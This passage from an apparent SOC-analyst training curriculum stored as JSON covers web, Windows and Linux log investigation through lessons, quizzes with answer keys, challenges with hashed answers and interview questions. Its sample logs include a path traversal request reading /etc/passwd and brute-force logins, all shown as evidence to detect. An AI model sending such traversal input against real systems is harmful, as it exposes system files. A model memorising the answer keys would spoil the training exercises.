\"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n10.0.0.15 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:05 +0200] \"POST /login HTTP/1.1\" 302 0 \"-\" \"python-requests/2.32.3\"\n10.0.0.15 - - [12/Nov/2026:10:04:20 +0200] \"POST /login HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n192.0.2.60 - - [12/Nov/2026:10:06:31 +0200] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 1843 \"-\" \"curl/8.5.0\"\n10.0.0.22 - - [12/Nov/2026:10:07:10 +0200] \"GET /checkout HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)\"","qs":[{"p":"IP performing SQL injection","h":["1fpatp6y2wd"],"hint":""},{"p":"Tool the SQL injection attacker is using","h":["1yimboebnan"],"hint":"One word"},{"p":"How many failed logins did 203.0.113.9 make before getting in?","h":["25i2gekeftp"],"hint":"A number. Careful: another client also failed once"},{"p":"Attack type used by 192.0.2.60","h":["6bolpye8kp","124w1z7fwnx","1hyei00w4o0","2cw7xbz0fpv","ehqx32ooiu"],"hint":""},{"p":"Did the request from 192.0.2.60 succeed, judging by the status code? (yes/no)","h":["194ge77ynxg"],"hint":""}]},"iv":[["How do you tell from logs whether a SQL injection succeeded?","I compare status codes and response sizes. A 200 with a much larger body than normal for that page, a time delay matching a sleep payload, or errors that turn into clean responses suggest success. Then I check the database and application logs for the queries."],["Explain XSS and its impact.","The application returns attacker-supplied script to other users' browsers. It runs in their session, so it can steal cookies, perform actions as the user or redirect them. Prevention is output encoding and a content security policy."],["You see 500 failed logins from one IP in a minute. What do you do?","Confirm it in the logs, check whether any attempt succeeded, identify the targeted accounts, block or rate-limit the source, and if there was a success treat that account as compromised: reset, revoke sessions, review its activity."]],"res":[["video","Running an SQL Injection Attack","https://www.youtube.com/watch?v=ciNHn38EyRc","Computerphile",17,1],["read","SQL injection: explanation, then the first two free labs","https://portswigger.net/web-security/sql-injection","PortSwigger Web Security Academy",40,1],["read","Cross-site scripting","https://portswigger.net/web-security/cross-site-scripting","PortSwigger Web Security Academy",20,0],["read","Path traversal","https://portswigger.net/web-security/file-path-traversal","PortSwigger Web Security Academy",15,0],["read","HTTP response status codes","https://developer.mozilla.org/en-US/docs/Web/HTTP/Status","MDN",10,0],["read","Apache log files: the access log format","https://httpd.apache.org/docs/2.4/logs.html","Apache",10,0],["read","OWASP Top 10","https://owasp.org/www-project-top-ten/","OWASP",15,0],["video","Web Security lectures on the module page","https://pwn.college/intro-to-cybersecurity/web-security","pwn.college",60,0],["video","Cracking Websites with Cross Site Scripting","https://www.youtube.com/results?search_query=Computerphile%20Cracking%20Websites%20with%20Cross%20Site%20Scripting","Computerphile (YouTube search)",9,0],["practice","All free Web Security Academy labs","https://portswigger.net/web-security/all-labs","PortSwigger",120,0],["practice","Juice Shop: a deliberately vulnerable shop to attack and then read the logs of","https://owasp.org/www-project-juice-shop/","OWASP",90,0],["read","Cheat Sheet Series: how each bug class is prevented","https://cheatsheetseries.owasp.org/","OWASP",20,0],["read","Core Rule Set: what WAF rules look like","https://coreruleset.org/","OWASP CRS",15,0]],"check":"I can recognise SQLi, XSS, traversal and brute force in a log line and say whether it worked."},{"title":"Windows tells you everything","module":"Windows security monitoring","goal":"Reconstruct a Windows intrusion from Security, System and Sysmon event IDs without a SIEM.","tasks":[["room","Windows Logging for SOC",1,"windowsloggingforsoc","Windows Security Monitoring"],["room","Windows Threat Detection 1",1,"windowsthreatdetection1","Windows Security Monitoring"],["room","Windows Threat Detection 2",1,"windowsthreatdetection2","Windows Security Monitoring"],["room","Windows Threat Detection 3",1,"windowsthreatdetection3","Windows Security Monitoring"],["own","On your own Windows PC open Event Viewer, filter Security for 4624 and 4625, and find your last logon and its logon type",0.5],["own","Write the event ID table below from memory on paper, then check it",0.5]],"lesson":"\u003cp>Most corporate endpoints are Windows. A handful of event IDs answer most questions an L1 analyst is asked, so memorise them.\u003c/p>\n\u003ch4>Event IDs to know cold\u003c/h4>\n\u003cpre>Security log\n4624  logon success          4625  logon failure\n4634  logoff                 4648  logon with explicit credentials (runas)\n4672  admin privileges assigned at logon\n4688  process created (needs command-line auditing)\n4720  user created           4726  user deleted\n4728/4732  user added to a global/local security group\n4768  Kerberos TGT requested 4769  Kerberos service ticket requested\n1102  audit log cleared\n\nSystem log\n7045  new service installed\n\nSysmon\n1 process create   3 network connection   11 file create\n13 registry value set   22 DNS query\u003c/pre>\n\u003ch4>Logon types\u003c/h4>\n\u003cpre>2 interactive (keyboard)   3 network (SMB, shares)   4 batch\n5 service   7 unlock   10 RemoteInteractive (RDP)   11 cached\u003c/pre>\n\u003ch4>Persistence spots\u003c/h4>\u003cul>\u003cli>Run keys: \u003ccode>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003c/code> and the HKLM equivalent\u003c/li>\u003cli>Scheduled tasks, services, Startup folder\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>One 4625 means a typo. Judge by pattern: many failures for one account is brute force; one failure each across many accounts from one source is password spraying.\u003c/p>","quiz":[{"q":"Which Security event ID records a successful logon?","o":["4625","4624","4688","4720"],"a":1,"why":"4624 success, 4625 failure."},{"q":"A 4624 event shows Logon Type 10. How did the user log on?","o":["At the keyboard","Over RDP","As a service","Via a network share"],"a":1,"why":"Type 10 is RemoteInteractive. Type 3 is network, type 2 is local interactive."},{"q":"Which event ID records a new process, when auditing is enabled?","o":["4688","4624","7045","1102"],"a":0,"why":"4688 in the Security log; Sysmon event 1 gives the same with richer detail."},{"q":"What does Sysmon event ID 3 record?","o":["Process creation","A network connection","A registry change","A DNS query"],"a":1,"why":"Sysmon 1 process, 3 network, 11 file create, 13 registry, 22 DNS."},{"q":"Which event ID shows that a user account was created?","o":["4720","4732","4768","4634"],"a":0,"why":"4720 created. 4732 means a member was added to a local group."},{"q":"Which registry key is a common persistence location?","o":["HKLM\\HARDWARE","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKCR\\.txt","HKU\\.DEFAULT\\Keyboard Layout"],"a":1,"why":"Values under Run start at every logon of that user."},{"q":"Event 7045 appears in the System log. What happened?","o":["A user logged off","A new service was installed","The firewall was disabled","A file was deleted"],"a":1,"why":"Services are a favourite for persistence and for remote execution tools such as PsExec."}],"chal":{"title":"What happened on SRV-FILE-01?","brief":"These are exported Security events from a file server, in time order. Reconstruct the intrusion.","evidence":"# Security log export, SRV-FILE-01, 2026-11-11\nTime      EventID  Details\n01:12:04  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A (bad password)\n01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:06  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:07  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:09  4624     Account=svc_backup  LogonType=3  Source=10.1.1.50\n01:12:09  4672     Account=svc_backup  Privileges=SeBackupPrivilege, SeDebugPrivilege\n01:13:30  4720     NewAccount=helpdesk2  CreatedBy=svc_backup\n01:13:41  4732     Member=helpdesk2  Group=Administrators  AddedBy=svc_backup\n01:15:02  4624     Account=helpdesk2  LogonType=10  Source=10.1.1.50\n01:19:55  1102     The audit log was cleared. Subject=helpdesk2","qs":[{"p":"Which account was brute-forced?","h":["o8iuui9lp6"],"hint":""},{"p":"Logon type of the attacker's first successful logon","h":["1khvl40f9c"],"hint":"A number"},{"p":"Name of the account the attacker created","h":["psh6grevmv"],"hint":""},{"p":"Which group gave that account its power?","h":["1qkhbdnmes6","28r7n2g22qj","1a34p9wlsgb"],"hint":""},{"p":"How did the attacker log on at 01:15:02? Name the protocol","h":["2181tc3owzz","1c0z8f0ndme","26gt24eac3h","i7l4o67o57"],"hint":""},{"p":"Event ID that shows the attacker covering tracks","h":["1e53qtsdty3"],"hint":""}]},"iv":[["Which Windows event IDs do you use most and why?","4624 and 4625 for logon success and failure, with the logon type. 4688 or Sysmon 1 for process creation. 4720 and 4732 for new accounts and group changes. 7045 for new services. 1102 for log clearing. Together they cover access, execution, persistence and anti-forensics."],["How do you tell brute force from password spraying in the logs?","Brute force is many failures against one account. Spraying is one or two attempts against many accounts from the same source, designed to stay below lockout. I group 4625 events by source and count distinct usernames."],["Name three common Windows persistence mechanisms.","Run keys in the registry, scheduled tasks, and services. I would look at Sysmon 13 for registry writes, task creation events and 7045 for services."]],"res":[["read","Windows Security Log Encyclopedia: look up 4624, 4625, 4688, 4720, 4732, 1102","https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/","Ultimate Windows Security",25,1],["video","Event log forensics, including RDP logons","https://www.youtube.com/results?search_query=13Cubed%20event%20log%20forensics%20RDP","13Cubed (YouTube search)",30,1],["practice","Room: Windows Logging for SOC","https://tryhackme.com/room/windowsloggingforsoc?pathCode=soclevel1","TryHackMe",60,0],["read","Sysmon: what each event ID records","https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon","Microsoft Learn",20,0],["read","A well-commented Sysmon configuration","https://github.com/SwiftOnSecurity/sysmon-config","SwiftOnSecurity",15,0],["read","Events to monitor in Active Directory","https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","Microsoft Learn",15,0],["read","Event 4624 documentation, field by field","https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624","Microsoft Learn",15,0],["practice","EVTX attack samples: real event logs of known techniques","https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES","GitHub, sbousseaden",60,0],["tool","Hayabusa: fast timeline and threat hunting over event logs","https://github.com/Yamato-Security/hayabusa","Yamato Security",30,0],["read","Tool Analysis Result Sheet: which logs each attacker tool leaves behind","https://jpcertcc.github.io/ToolAnalysisResultSheet/","JPCERT/CC",20,0],["read","Sigma: generic detection rules, many for Windows events","https://github.com/SigmaHQ/sigma","SigmaHQ",20,0]],"check":"I can write the event ID and logon type tables from memory."},{"title":"Linux under attack","module":"Linux security monitoring and log scripting","goal":"Investigate a Linux server from the command line: logins, processes, persistence, and fast log slicing with grep, awk and sort.","tasks":[["room","Linux Logging for SOC",1,"linuxloggingforsoc","Linux Security Monitoring"],["room","Linux Threat Detection 1",1,"linuxthreatdetection1","Linux Security Monitoring"],["room","Linux Threat Detection 2",1,"linuxthreatdetection2","Linux Security Monitoring"],["room","Linux Threat Detection 3",1,"linuxthreatdetection3","Linux Security Monitoring"],["own","Write a 15-line Bash or Python script that reads an auth.log and prints the top 5 IPs by failed logins. Test it on the challenge data",1.5],["pwn","pwn.college \"Web Security\": 4 more challenges, to keep last week's material alive",1.5]],"lesson":"\u003cp>You finished Linux Luminarium, so the shell itself is not new. This week turns it into an investigation tool.\u003c/p>\n\u003ch4>Where to look\u003c/h4>\n\u003cpre>/var/log/auth.log      SSH, sudo (Debian/Ubuntu; /var/log/secure on RHEL)\n/var/log/syslog        general system messages\njournalctl -u ssh      systemd journal for one service\nlast, lastb            successful and failed logins\n~/.bash_history        what a user typed\n/etc/passwd, /etc/shadow, ~/.ssh/authorized_keys     accounts and keys\u003c/pre>\n\u003ch4>Live triage\u003c/h4>\n\u003cpre>ps auxf                         process tree\nss -tulpn                       listening ports and owning process\nls -la /tmp /dev/shm /var/tmp   world-writable dirs attackers love\ncrontab -l ; ls /etc/cron.*     scheduled persistence\nsystemctl list-units --type=service --state=running\nls -l /proc/PID/exe             the real binary, even if deleted\u003c/pre>\n\u003ch4>Log slicing\u0
